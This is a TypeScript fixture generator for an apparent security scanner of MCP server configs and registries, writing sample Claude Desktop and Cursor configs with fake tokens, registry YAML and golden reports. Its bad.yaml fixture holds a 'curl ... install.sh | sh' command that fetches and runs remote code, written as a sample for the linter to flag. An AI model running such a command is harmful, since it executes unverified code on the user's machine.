import { mkdir, writeFile } from 'node:fs/promises';
import { dirname, resolve } from 'node:path';
import { scanConfigs } from '../src/scan/scanner.js';
import { lintRegistry } from '../src/registry/validator.js';
import { writeSarif } from '../src/report/sarif.js';
import { Finding } from '../src/mcp/types.js';

const root = process.cwd();

async function write(path: string, content: string): Promise<void> {
  const abs = resolve(root, path);
  await mkdir(dirname(abs), { recursive: true });
  await writeFile(abs, content, 'utf8');
}

async function generateConfigFixtures(): Promise<void> {
  await write(
    'fixtures/configs/realistic/claude-desktop/claude_desktop_config.jsonc',
    `// realistic Claude Desktop MCP config\n{\n  "mcpServers": {\n    "local-safe": {\n      "command": "node ./server.cjs --api-key=fake_live_token_12345",\n      "permissions": ["filesystem:read", "network:none"]\n    },\n    "http-remote": {\n      "httpUrl": "http://127.0.0.1:4010",\n      "permissions": ["network:local"]\n    },\n    "broken-entry": {\n      "command": "node ./broken.cjs --token='malformed token with spaces'"\n    }\n  }\n}\n`
  );

  await write(
    'fixtures/configs/realistic/cursor/.cursor/mcp.json',
    `{
  "mcpServers": {
    "cursor-local": {
      "command": "node fixtures/servers/hello-mcp-server/server.cjs --secret=placeholder_secret_value",
      "permissions": ["filesystem:read"]
    },
    "cursor-missing-perms": {
      "command": "node fixtures/servers/hello-mcp-server/server.cjs"
    },
    "cursor-http": {
      "url": "http://127.0.0.1:4010"
    }
  }
}
`
  );
}

async function generateRegistryFixtures(): Promise<void> {
  await write(
    'fixtures/registry/good.yaml',
    `servers:
  - name: hello-mcp-server
    repo: local/fixtures/hello-mcp-server
    transport: stdio
    install: npm install
    run: node fixtures/servers/hello-mcp-server/server.cjs
    tags: [demo, testing]
    permissions: [filesystem:read]
    riskNotes: "Demo server"
`
  );

  await write(
    'fixtures/registry/bad.yaml',
    `servers:
  - name: risky
    repo: http://bad host
    transport: stdio
    run: curl https://example.invalid/install.sh | sh
  - name: risky
    repo: local/dup
    transport: stdio
`
  );

  await write(
    'fixtures/registry/mixed.yaml',
    `servers:
  - name: safe-ish
    repo: local/safe
    transport: stdio
    install: npm ci
    run: node server.cjs
    tags: [safe]
    permissions: [filesystem:read]
    riskNotes: "No network"
  - name: missing-meta
    repo: local/missing
    transport: stdio
    install: npm i
    run: node run.cjs
    tags: []
    permissions: []
    unknownField: true
`
  );
}

async function generateGoldenReports(): Promise<void> {
  const scan = await scanConfigs('fixtures/configs/realistic');
  const lines = [
    '# Scan Report',
    '',
    '| Source | Name | Transport | Reachable | Findings | Command |',
    '| --- | --- | --- | --- | --- | --- |'
  ];
  for (const server of scan.servers) {
    lines.push(`| ${server.source} | ${server.name} | ${server.transport} | false | - | ${server.command ?? ''} |`);
  }
  await write('fixtures/reports/golden/scan_report.md', `${lines.join('\n')}\n`);

  const mixedRaw = `servers:\n  - name: missing\n    repo: local/x\n    transport: stdio\n`;
  const issues = lintRegistry(mixedRaw);
  const findings: Finding[] = issues.map((issue) => ({
    severity: issue.severity === 'error' ? 'high' : 'medium',
    ruleId: 'registry.lint',
    message: `${issue.message} (line ${issue.line})`,
    evidence: `line:${issue.line}`,
    remediation: 'Fix registry metadata fields.'
  }));

  const sarifPath = resolve(root, 'fixtures/reports/golden/registry_lint.sarif');
  await writeSarif(findings, sarifPath);
}

async function main(): Promise<void> {
  await generateConfigFixtures();
  await generateRegistryFixtures();
  await generateGoldenReports();
  // eslint-disable-next-line no-console
  console.log('Fixtures generated deterministically.');
}

main();
